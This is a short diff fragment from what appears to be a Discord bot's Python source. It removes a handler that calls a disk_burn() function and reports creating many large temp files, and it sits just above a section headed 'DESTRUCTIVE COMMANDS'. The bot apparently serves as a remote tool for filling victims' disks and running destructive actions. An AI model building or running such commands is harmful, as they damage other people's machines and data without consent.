-        files = disk_burn()
-        await send_embed(ctx, "💿 Disk Burn Complete", f"Created **{files}** large temp files!", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
 
 # ========== DESTRUCTIVE COMMANDS ==========
 
